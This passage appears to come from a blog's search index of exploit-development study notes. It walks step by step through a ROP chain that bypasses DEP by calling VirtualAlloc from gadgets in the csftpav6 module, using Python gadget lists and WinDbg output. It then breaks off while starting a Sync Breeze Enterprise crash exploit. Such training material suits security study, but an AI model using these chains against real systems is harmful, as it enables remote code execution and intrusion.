this way, the value inside eax (iat pointer) is obtained and stored in eax. now, eax contains the real address of virtualalloc:\nbreakpoint 0 hit eax=5054a220 ebx=064fb018 ecx=5054a221 edx=77042da0 esi=0102e2f0 edi=00000000 eip=5051f278 esp=0102e33c ebp=51515151 iopl=0 nv up ei pl nz ac po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213 csftpav6!ftpuploadfilew+0xe3da: 5051f278 8b00 mov eax,dword ptr [eax] ds:0023:5054a220={kernel32!virtualallocstub (76605680)} 0:002\u0026gt; p eax=76605680 ebx=064fb018 ecx=5054a221 edx=77042da0 esi=0102e2f0 edi=00000000 eip=5051f27a esp=0102e33c ebp=51515151 iopl=0 nv up ei pl nz ac po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213 csftpav6!ftpuploadfilew+0xe3dc: 5051f27a c3 ret 0:002\u0026gt; u eax kernel32!virtualallocstub: 76605680 8bff mov edi,edi 76605682 55 push ebp 76605683 8bec mov ebp,esp 76605685 5d pop ebp 76605686 ff2540b86676 jmp dword ptr [kernel32!_imp__virtualalloc (7666b840)] 7660568c cc int 3 7660568d cc int 3 7660568e cc int 3 we successfully jumped to the virtualalloc function! eax contains a pointer to this value.\n3. patching virtualalloc address with the obtained one the last step is to replace the value we have in the location pointed by esi, which is the address in the stack that holds the dummy value of virtualalloc, for this obtained value. if we think a bit, a mov [esi], eax gadget will be enough:\n0x50524ea4: mov dword [esi], eax ; ret ; (1 found) let\u0026rsquo;s add this gadget in our rop chain and see the final value of the address pointed by esi:\n0:002\u0026gt; p eax=76605680 ebx=066db7a8 ecx=5054a221 edx=77042da0 esi=00fbe2f0 edi=00000000 eip=50524ea4 esp=00fbe340 ebp=51515151 iopl=0 nv up ei pl nz ac po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213 csftpav6!ftpuploadfilew+0x14006: 50524ea4 8906 mov dword ptr [esi],eax ds:0023:00fbe2f0=45454545 0:002\u0026gt; p eax=76605680 ebx=066db7a8 ecx=5054a221 edx=77042da0 esi=00fbe2f0 edi=00000000 eip=50524ea6 esp=00fbe340 ebp=51515151 iopl=0 nv up ei pl nz ac po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000213 csftpav6!ftpuploadfilew+0x14008: 50524ea6 c3 ret 0:002\u0026gt; dds esi l1 00fbe2f0 76605680 kernel32!virtualallocstub if we inspect the stack (a bit down as we have inserted a lot of gadgets) we can see that the address pointed by esi is the dummy value, that has been replaced with the correct value of virtualalloc:\n0:002\u0026gt; dds esp - 54 00fbe2ec 41414141 00fbe2f0 76605680 kernel32!virtualallocstub // [esi] pointed here, we managed to overwrite this value 00fbe2f4 46464646 00fbe2f8 00000000 00fbe2fc 48484848 00fbe300 00000000 00fbe304 00000000 00fbe308 00fbe30c 00fbe30c 5050118e csftpav6+0x118e // these are our rop gadgets and values 00fbe310 42424242 00fbe314 505115a3 csftpav6!ftpuploadfilew+0x705 00fbe318 ffffffe4 00fbe31c 5051579a csftpav6!ftpuploadfilew+0x48fc 00fbe320 00fbe2f0 00fbe324 5053a0f5 csftpav6!ftpuploadfilew+0x29257 00fbe328 ffffffff 00fbe32c 505115a3 csftpav6!ftpuploadfilew+0x705 00fbe330 5054a221 csftpav6!ftpuploadfilew+0x39383 00fbe334 5051579a csftpav6!ftpuploadfilew+0x48fc 00fbe338 5051f278 csftpav6!ftpuploadfilew+0xe3da 00fbe33c 50524ea4 csftpav6!ftpuploadfilew+0x14006 patching the return address (our shellcode) using rop remember that we inserted a dummy address prior to the call to virtualalloc? this is the dummy address that will be in the top of the stack when virtualalloc executes the ret instruction. as we haven\u0026rsquo;t performed a call instruction as we are jumping via gadgets, we have to push the dummy address manually. now, we pushed a dummy address, that we need to patch with the dynamic address of where our shellcode is located. we will do basically the same as we did with virtualalloc: first, we must align esi with the placeholder value for the return address on the stack. then we need to dynamically locate the address of the shellcode and use it to patch the placeholder value.\nnote: we can avoid starting from 0 as when the last rop chain was executed, esi was storing the address of virtualalloc, which is 4 bytes lower than the return address. remember what information do your register contain in order to reuse it. an instruction like add esi, 0x04 would be great but it\u0026rsquo;s not available in this module. in our case, we can find an inc esi instruction. it\u0026rsquo;s not clean, but there are several gadgets that can do not have bad side effects, like the following:\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret note that the inc instruction increments the register by one byte, so we have to add the instruction four times in order to increment esi by four bytes. the side effect will only modify eax, which we do not have to worry about at this point:\n# step 2. modify the shellcode address, return address, for our dynamically obtained shellcode address. # substract 4 bytes from esi so it points to our dummy shellcode address in stack (0x46464646) rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret once the four gadgets are executed, if we take a look at esi, it points to our controlled shellcode dummy value in the stack:\n0:006\u0026gt; dd esi l1 0d4fe304 46464646 with esi aligned correctly, we need to get the shellcode address in eax so that we can reuse the “mov dword [esi], eax ; ret” gadget to patch the placeholder value. the issue we face now is that we do not know the exact address of the shellcode since it will be placed after our rop chain, which we haven’t finished creating yet. note that we don\u0026rsquo;t know where our shellcode will be as we will place it after the rop chain, and not before it, as we have been doing in the previous buffer overflow techniques.\nthe approach to patch the value after we have placed all the rop gadgets is using the value in esi and adding a fixed value to it. once we finish building the rop chain, we can update the fixed value to correctly align with the beginning of the shellcode.\nfirst, we need to copy esi into eax. we need to do this in such a way that we keep the existing value in esi in a register like eax as a backup, since we need it there to patch the placeholder value. the idea is to:\nhave in esi the address of the pointer to our shellcode have in eax the address of our shellcode so then we can fix [esi] with eax properly. now we will use a dummy eax value, like esi minus a certain fixed offset, just to have the gadgets properly stored in the stack. we will replace the offset value afterwards. an instruction like “mov eax, esi” is optimal, but unfortunately, the only gadgets containing this instruction also pop a value into esi. we can however solve this by restoring the value in esi with the previously-used “push eax ; pop esi ; ret” gadget. this way we can do the following: rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5050118e)) # mov eax, esi ; pop esi ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x42424242)) # junk rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5052f773)) # push eax ; pop esi ; ret we basically have now the same value in esi and eax. now, we add the offset to eax. remember that it is a dummy offset. note: do not use badchars for the offsets, even if they are dummy. for example, instead 0x200, use 0x210.\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x505115a3)) # pop ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0xfffffdf0)) # -0x210 rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50533bf4)) # sub eax, ecx ; ret here we have substracted eax 210 bytes (dummy quantity). once we know the exact offset from esi to the shellcode, we can update the 0xfffffdf0 value to the correct one. at this point, eax contains a placeholder address for our shellcode, which we can update once we finish building the entire rop chain.\nnote: see how we have reused several gadgets for this section! not only gadgets, but also the value of the registers that are already stored due to prior gadget chains.\npatching arguments to virtualalloc we have successfully created and executed a partial rop chain that locates the address of virtualalloc from the iat and the shellcode address, and then updates the api call skeleton on the stack.\nin this section, we must patch all four arguments required by virtualalloc to disable dep. let\u0026rsquo;s recap the function prototype of virtualalloc:\nlpvoid virtualalloc( [in, optional] lpvoid lpaddress, [in] size_t dwsize, [in] dword flallocationtype, [in] dword flprotect ); normally, we want the following:\nlpaddress should be the same value as the return address (the value of our shellcode) dwsize to be 0x01 flallocationtype 0x1000 flprotect 0x40 patching lpaddress regarding lpaddress, we first need to know where this address is in the stack. if we take a look, we can see that it is 4 bytes lower than the esi register (which contain the return address) so we can increment esi by four in order to have control over lpaddress. let\u0026rsquo;s use the same increment instructions:\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret additionally, since lpaddress needs to point to our shellcode, we can reuse the same gadgets as before and only subtract a different negative value from eax. in the previous example, we used the somewhat arbitrary value of -0x210 to align eax to our shellcode. since we increased esi by 4, we need to use -0x20c or 0xfffffdf4 this time, as shown in the updated rop chain below. we will reproduce the rop chain to copy esi value into eax and then substract eax 0x20c:\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5050118e)) # mov eax, esi ; pop esi ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x42424242)) # junk rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5052f773)) # push eax ; pop esi ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x505115a3)) # pop ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0xfffffdf4)) # -0x20c rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50533bf4)) # sub eax, ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051cbb6)) # mov dword [esi], eax ; ret it is getting a lot easier to expand on our technique because we have already located most of the required gadgets and performed similar actions.\nnow if we run the code, and inspect lpaddress and the return address, they should point to the same dummy address. once we know the real offset from the shellcode, we will fix the offset and they should point to the shellcode address.\npatching dwsize now we are going to move to dwsize, which we can set to 0x01, since virtualalloc will apply the new protections on the entire memory page. the issue is that the value is really a dword (0x00000001), so it will contain null bytes. we can\u0026rsquo;t perform a mov or an inc instruction, so we need to use another technique. the new technique that we will use is the neg instruction. this instruction will replace the value in a register for its two\u0026rsquo;s complement. this is equivalent to substract the value from zero. in 32 bits we can abuse the fact that we can perform this operation and ignore the upper dword of the result to obtain the value we want.\nfor example, if we want to obtain 0x00000001, we can substract ffffffff from 0 and take the lower dword:\n0:006\u0026gt; ? 0 - ffffffff evaluate expression: -4294967295 = ffffffff`00000001 stripping the upper part is done automatically since registers on a 32-bit operating system can only contain the lower dword. note that this is not valid per se in x64 and we would have to truncate the register (as the ffffffff value would exist after the calculation). therefore, if we want to obtain a 0x01 value, we can just negate fffffffff from a register. note: in 32 bits, we can use neg (compliment of two) of any value to obtain the same value but in positive, in the case that the value has null bytes.*\nonce again, we must point to the dwsize variable in the stack to modify it. and once again, this variable is 4 bytes higher than esi. so we can increment esi by four again and then pop the value 0xffffffff into eax and negate it. lastly, we can override the value that dwsize has for this value in eax, which is 0x01.\npatching flallocationtype now we must move to flallocationtype, which must be set to 0x1000. we could try to reuse the trick of negation but we notice that two’s complement to 0x1000 is 0xfffff000, which also contains null bytes, so we keep having the problems:\n0:063\u0026gt; ? 0 - 1000 evaluate expression: -4096 = fffff000 while it would be possible to perform some tricks to fix this problem, we are going to use a different technique to highlight the fact that when selecting gadgets, we must often think creatively. we’re going to use the existing gadgets we found, which will allow us to pop arbitrary values into eax and ecx and subsequently perform an addition of them.\nwe want to have 0x1000 as our final value in any register. we can substract any value with non-null badchars from 0x1000 and we can take the dword of the result and add it to the value we have chosen. this results in our 0x1000 value again, but we replace 0x1000 for these two values, the one we have chosen and the dword of the result, to obtain our desired value. let\u0026rsquo;s see it graphically:\n0:063\u0026gt; ? 1000 - 80808080 evaluate expression: -2155901056 = ffffffff`7f7f8f80 0:063\u0026gt; ? 80808080 + 7f7f8f80 evaluate expression: 4294971392 = 00000001`00001000 note: both values, the one chosen and its dword result from substraction, should not have badchars. it is recommended to choose long values. now we need to update our rop chain to pop 0x80808080 into eax, pop 0x7f7f8f80 into ecx, and then add them together to obtain 0x1000 (due to the 32 bit truncation). remember that to access flallocationtype dummy address we have to increment esi by four again.\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5053a0f5)) # pop eax ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x80808080)) # first value to be added rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x505115a3)) # pop ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x7f7f8f80)) # second value to be added rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051579a)) # add eax, ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051cbb6)) # mov dword [esi], eax ; ret note: due to the reuse of some gadgets, we can create conditional breakpoint to stop in a gadget but only if the value of the registers are the ones we want. for example, here stop in 0x505179a only if eax is 0x80808080:\nbp 0x5051579a \u0026#34;.if (@eax \u0026amp; 0x0`ffffffff) = 0x80808080 {} .else {gc}\u0026#34; patching flprotect the last argument is the new memory protection value, which, in essence, is what allows us to bypass dep. we want the enum page_execute_readwrite, which has the numerical value 0x40. in order to write that to the stack, we will reuse the same technique we did for flallocationtype. as it has null bytes (0x00000040) we have to do the neg trick. let\u0026rsquo;s find out the value:\n0:063\u0026gt; ? 40 - 80808080 evaluate expression: -2155905088 = ffffffff`7f7f7fc0 0:063\u0026gt; ? 80808080 + 7f7f7fc0 evaluate expression: 4294967360 = 00000001`00000040 according to the additions, we can use the values 0x80808080 and 0x7f7f7fc0 to obtain the desired value of 0x40. this would be the rop chain to patch flprotect, doing everything we have done for the other variables (eip increment, setting up the operations and patching the value in the address):\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50522fa7)) # inc esi ; add al, 0x2b ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5053a0f5)) # pop eax ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x80808080)) # first value to be added rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x505115a3)) # pop ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x7f7f7fc0)) # second value to be added rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051579a)) # add eax, ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051cbb6)) # mov dword [esi], eax ; ret note: we have finished our full exploit with all the gadgets. a recommendation is to add the following gadget that will make a software breakpoint, in order to execute the entire rop chain and catch the execution flow jut after the flprotect value has been patched:\nrop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051e4db)) # int3 ; push eax ; call esi note that only int3 will be executed, the other instructions will get paused. remember to remove it after inspecting that everything works:\n0:078\u0026gt; g (16b0.4c0): break instruction exception - code 80000003 (first chance) eax=00000040 ebx=05aebf60 ecx=7f7f7fc0 edx=77292da0 esi=0184e304 edi=00000000 eip=5051e4db esp=0184e40c ebp=51515151 iopl=0 nv up ei pl nz na po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000203 csftpav6!ftpuploadfilew+0xd63d: 5051e4db cc int 3 0:055\u0026gt; dds esi - 14 0184e2f0 76c05680 kernel32!virtualallocstub 0184e2f4 0184e504 0184e2f8 0184e504 0184e2fc 00000001 0184e300 00001000 0184e304 00000040 as we can see in esi and lower locations the prepared call stack for the virtualalloc function has been prepared. we have the correct address for virtualalloc, the return address, and the four parameters: lpaddress, dwsize, flallocationtype and lpprotect.\nfixing esp to execute virtualalloc the rop chain to set up the address for virtualalloc, the return address, and all four arguments has been created and verified to work. the only step that remains to bypass dep is to invoke the api. in order to invoke the api, we must jump to the \u0026ldquo;virtualalloc\u0026rdquo; address in the stack. how do we jump? by forcing esp to point to such address and then performing a ret instruction (ret single gadget). in order to force esp to point to such address, we must perform a rop chain to move esp here:\n0:055\u0026gt; dds esi - 14 0184e2f0 76c05680 kernel32!virtualallocstub \u0026lt;- esp should point here 0184e2f4 0184e504 0184e2f8 0184e504 0184e2fc 00000001 0184e300 00001000 0184e304 00000040 note that the return address and lpaddress do not point to our shellcode yet. we need to fix these values later. let\u0026rsquo;s focus on the rop chain needed to esp to point to this address.\nsadly, there is no simple way to modify esp, so we must take a small detour. the only useful gadget we found for this task is a mov esp, ebp ; pop ebp ; ret. however, this is only useful is ebp previously points to our virtualalloc address in the stack. let\u0026rsquo;s force ebp to point to our virtualalloc address.\nfirst, we must remember that when the rop chain has been finished patching the arguments of virtualalloc, esi will contain the address of the last parameter (flprotect). we can use this address and substract the bytes from this address to the address of virtualalloc in the stack. any small value will contain null bytes, so instead we can leverage the fact that when 32-bit registers overflow, any bits higher than 32 will be discarded. instead of subtracting a small value that contains null bytes, we can add a large value. this will allow us to align eax with the virtualalloc address on the stack. note: if you have to add a value to another one, in 32 bits you can abuse the fact that adding a large value will overflow. sometimes adding a large value is the same as adding a small value (with badchars). only 32 bits.\ntherefore, what we will do is:\nuse eip that is near our desired address. move eip to eax substract some bytes to eax to reach our desired address in the stack (note: we do this in eax as there are more gadgets with eax). move eax to ebx move ebx to esp we have to move eax to ebx and then ebx to esp as there are not direct gadgets. therefore, we have to play a bit with the registers.\nthe gadget that moves ebp into esp has a side effect of popping a value into ebp. we must compensate for this and configure the stack so that a dummy dword just before the virtualalloc address is popped into ebp.\nthe gadget chain to move esp to our desired address is the following:\n# put esp to point to virtualalloc address in stack. # in order to set esp, we need gadgets that operate with esi, eax, ecx, ebp and finally esp. # there are not direct pop esp gadgets or similar. rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5050118e)) # mov eax,esi ; pop esi ; retn rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x42424242)) # junk rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x505115a3)) # pop ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0xffffffe8)) # negative offset value rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051579a)) # add eax, ecx ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x5051571f)) # xchg eax, ebp ; ret rop += pack(\u0026#34;\u0026lt;l\u0026#34;, (0x50533cbf)) # mov esp, ebp ; pop ebp ; ret through trial and error, we find that we want to subtract 0x18 bytes from eax to obtain the correct stack pointer alignment, which means we must add 0xffffffe8 bytes (same as substracting 0x18 bytes). note that we put esp before the virtualalloc address as we end doing a pop ebp gadget. note: in this case we reused a value that was in the stack so we pointed ebp 4 bytes higher and we made a pop instruction so esp is decremented and ebp takes such value. we cant do the strategy of putting other value as the next in the gadget chain as we are doing a mov esp, which means that esp is not going to point anymore to our rop gadget! remember that moving esp means that we lose control of our gadgets. so we have to do the offset-4\nnow, we can put a breakpoint on any of the latest gadgets we added. note: as the gadget has been used several times, and we know eax value is 0x40 after patching flprotect, we can set a conditional breakpoint to stop on that gadget address if eax is 0x40:\nbp 0x5050118e \u0026#34;.if @eax = 0x40 {} .else {gc}\u0026#34; we can see that we stop just after patching flprotect:\n0:079\u0026gt; g eax=00000040 ebx=05e4b220 ecx=7f7f7fc0 edx=77182da0 esi=00fce304 edi=00000000 eip=5050118e esp=00fce40c ebp=51515151 iopl=0 nv up ei pl nz na po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000203 csftpav6+0x118e: 5050118e 8bc6 mov eax,esi let\u0026rsquo;s execute the rop chain and see where esp points to:\n0:004\u0026gt; p eax=51515151 ebx=0668b1c8 ecx=ffffffe8 edx=77182da0 esi=42424242 edi=00000000 eip=50533cbf esp=026ce424 ebp=026ce2ec iopl=0 nv up ei pl nz na po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000203 csftpav6!ftpuploadfilew+0x22e21: 50533cbf 8be5 mov esp,ebp 0:004\u0026gt; p eax=51515151 ebx=0668b1c8 ecx=ffffffe8 edx=77182da0 esi=42424242 edi=00000000 eip=50533cc1 esp=026ce2ec ebp=026ce2ec iopl=0 nv up ei pl nz na po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000203 csftpav6!ftpuploadfilew+0x22e23: 50533cc1 5d pop ebp 0:004\u0026gt; dd esp 026ce2ec 41414141 76a65680 026ce504 026ce504 we can see that the last pop ebp gadget we put is going to pop 41414141 (one of the dummy values we have inserted to reach eip) into ebp and then esp is going to point to our desired address.:\n0:004\u0026gt; dd esp l1 026ce2f0 76a65680 0:004\u0026gt; p eax=51515151 ebx=0668b1c8 ecx=ffffffe8 edx=77182da0 esi=42424242 edi=00000000 eip=76a65680 esp=026ce2f4 ebp=41414141 iopl=0 nv up ei pl nz na po cy cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000203 kernel32!virtualallocstub: 76a65680 8bff mov edi,edi now let\u0026rsquo;s see our shellcode address (top of stack, we are going to return to it after virtualalloc, remember we placed it on purpose). let\u0026rsquo;s see the protections:\n0:055\u0026gt; dd esp 01a0e2f4 01a0e504 01a0e504 00000001 00001000 0:055\u0026gt; !vprot 01a0e504 baseaddress: 01a0e000 allocationbase: 01970000 allocationprotect: 00000004 page_readwrite regionsize: 00062000 state: 00001000 mem_commit protect: 00000004 page_readwrite type: 00020000 mem_private let\u0026rsquo;s execute virtualprotect and see the protections again (we use pt here to stop until next return).\n0:055\u0026gt; pt eax=01a0e000 ebx=05d4a7e8 ecx=01a0e2c4 edx=77182da0 esi=42424242 edi=00000000 eip=755ddf31 esp=01a0e2f4 ebp=41414141 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 kernelbase!virtualalloc+0x51: 755ddf31 c21000 ret 10h 0:055\u0026gt; !vprot 01a0e504 baseaddress: 01a0e000 allocationbase: 01970000 allocationprotect: 00000004 page_readwrite regionsize: 00001000 state: 00001000 mem_commit protect: 00000040 page_execute_readwrite type: 00020000 mem_private before executing the api, we find that the memory protection is page_readwrite. but after executing the api, we observe that it is now the desired page_execute_readwrite.\naligning the shellcode with our return address the final step is to align our shellcode with the return address. note: instead of modifying the offsets used in the rop chain (would be another method, once we know the offset, modify it) we could also insert several padding bytes before the shellcode. we will do the second approach here.\nto find the number of padding bytes we need, we return out of virtualalloc and obtain the address of the first instruction we are executing on the stack. next, we dump the contents of the stack and obtain the address of where our rop chain ends in order to obtain its address and calculate the difference between the two. we are basically forcing our shellcode to be in the address that we previously inserted in the rop gadget chain. we just calculate the bytes that are missing from such address and add nops so that the shellcode starts in such address instead of just after the rop chain. note: in windows, the calling convention enforces that the called function decrements esp to clear the stack arguments. in linux, the caller function clears the argument after the flow its returned to it (with add esp, 8). basically, windows does the \u0026ldquo;add esp\u0026rdquo; in the ret. en español para que quede más claro: al setear esp con el dummy address que hemos puesto en el rop chain, esp está muy abajo (o arriba) de nuestro shellcode. nuestro shellcode en realidad está mas arriba (o abajo) de la pila. hay que ver la diferencia en bytes y añadir nops para que la dirección de salto que hemos puesto en la rop chain coincida justo donde empieza nuestro shellcode.\nlet\u0026rsquo;s see where we landed after executing virtualalloc:\n0:055\u0026gt; p eax=01a0e000 ebx=05d4a7e8 ecx=01a0e2c4 edx=77182da0 esi=42424242 edi=00000000 eip=01a0e504 esp=01a0e308 ebp=41414141 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246 01a0e504 43 inc ebx eip = 0x01a0e504. we can subtly see as the next instruction to execute is \u0026ldquo;43\u0026rdquo; meaning that we are jumping \u0026ldquo;inside\u0026rdquo; our shellcode. we have to jump to the start.\nlet\u0026rsquo;s see where does our rop chain start:\n0:055\u0026gt; dd esp + 100 01a0e408 5050118e 42424242 505115a3 ffffffe8 01a0e418 5051579a 5051571f 50533cbf 43434343 0:055\u0026gt; db 01a0e424 01a0e424 43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 cccccccccccccccc our shellcode starts in 0x01a0e424. let\u0026rsquo;s calculate the offset from eip:\n0:055\u0026gt; ? 0x01a0e424 - 0x01a0e504 evaluate expression: -224 = ffffff20 this means that we have to add 224 nops into our shellcode so the first starting byte is at address 0x01a0e504. our buffer starts fulfilling at 0x01a0e424, we will fill 224 nops and then the useful payload. note: the offset dummy value that we store in the stack must not be very big as it is better to have a small offset and then fix by adding nops in our shellcode rather than jumping further than our shellcode. the offset must be inside our shellcode, that\u0026rsquo;s for sure, so we can put nops and fix it afterwards. if not, we have to change the offset manually.\nafter sending the payload with the exact offset, we can see that eip points to exactly our shellcode:\n0:004\u0026gt; dds eip 024de504 cccccccc 0:004\u0026gt; dds eip - 1 024de503 cccccc43 note: the instruction cc (int 3, software breakpoint) has been executed in order to verify that everything works.\n","title":""},{"date":"0001-01-01","image":"","imageAlt":"","link":"http://localhost:1313/posts/osed_seh_1/","summary":"\u003ch1 id=\"analyzing-public-exploit\"\u003eAnalyzing public exploit\u003c/h1\u003e\n\u003cul\u003e\n\u003cli\u003eVulnerable Binary: Sync Breeze Enterprise v10.4.18\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eLet\u0026rsquo;s try to use the public exploit to trigger a crash:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/usr/bin/python  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e socket  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e struct \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e pack  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e server \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;192.168.122.113\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e port \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e9121\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e size \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e inputBuffer \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x41\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e size  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e header \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x75\\x19\\xba\\xab\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e header \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\x03\\x00\\x00\\x00\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e header \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan 